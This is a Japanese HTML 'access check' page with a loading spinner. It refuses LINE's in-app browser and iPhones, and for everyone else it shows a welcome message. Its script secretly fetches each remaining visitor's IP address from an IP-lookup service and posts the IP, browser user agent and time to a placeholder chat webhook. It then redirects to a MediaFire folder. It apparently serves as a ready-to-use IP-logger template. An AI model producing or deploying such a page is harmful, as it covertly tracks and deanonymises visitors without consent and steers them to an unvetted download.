<!DOCTYPE html>&#10;<html lang="ja">&#10;<head>&#10;&#32;&#32;<meta charset="UTF-8" />&#10;&#32;&#32;<meta name="viewport" content="width=device-width, initial-scale=1.0" />&#10;&#32;&#32;<title>&#12450;&#12463;&#12475;&#12473;&#30906;&#35469;&#20013;&#46;&#46;&#46;</title>&#10;&#32;&#32;<style>
    body {
      font-family: sans-serif;
      text-align: center;
      padding: 50px;
      background: #f8f8f8;
    }

    .loader {
      margin: 40px auto;
      width: 60px;
      height: 60px;
      border: 8px solid #ccc;
      border-top: 8px solid #3498db;
      border-radius: 50%;
      animation: spin 1s linear infinite;
    }

    @keyframes spin {
      0%   { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }

    .blocked {
      color: red;
      font-size: 24px;
    }

    .info {
      font-size: 20px;
    }

    .welcome {
      color: green;
      font-size: 24px;
    }
  </style>&#10;</head>&#10;<body>&#10;&#32;&#32;<p class="info">&#12487;&#12496;&#12452;&#12473;&#12434;&#30906;&#35469;&#20013;&#12391;&#12377;&#46;&#46;&#46;</p>&#10;&#32;&#32;<div class="loader"></div>&#10;&#10;&#32;&#32;<script>
    setTimeout(() => {
      const ua = navigator.userAgent || navigator.vendor || window.opera;
      const isLine = ua.toLowerCase().includes("line");
      const isIOS = /iPad|iPhone|iPod/.test(ua) && !window.MSStream;

      if (isLine) {
        document.body.innerHTML = `
          <p class="blocked">LINEアプリ内ブラウザではこのページを表示できません。</p>
          <p class="info">SafariやChromeなど標準のブラウザで開いてください。</p>
        `;
      } else if (isIOS) {
        document.body.innerHTML = `
          <p class="blocked">このサイトはiPhoneからのアクセスを制限しています。</p>
        `;
      } else {
        document.body.innerHTML = `
          <p class="welcome">✅ ようこそ！アクセスが許可されました。</p>
          <p class="info">3秒後にページへ移動します...</p>
        `;

        
        fetch("https://api.ipify.org?format=json")
          .then(res => res.json())
          .then(data => {
            const ip = data.ip;
            const userAgent = navigator.userAgent;

            const payload = {
              content: `📥 **アクセス許可ログ**\n🖥️ IP: \`${ip}\`\n🧭 UA: \`${userAgent}\`\n🕒 時間: <t:${Math.floor(Date.now() / 1000)}:F>`
            };

            fetch("YOUR_WEBHOOK_URL_HERE", {
              method: "POST",
              headers: {
                "Content-Type": "application/json"
              },
              body: JSON.stringify(payload)
            });
          });

        
        setTimeout(() => {
          window.location.href = "https://www.mediafire.com/folder/985svm5uxdr0x/%E4%BB%AE%E6%83%B3%E7%A9%BA%E9%96%93";
        }, 3000);
      }
    }, 3000);
  </script>&#10;</body>&#10;</html>&#10;
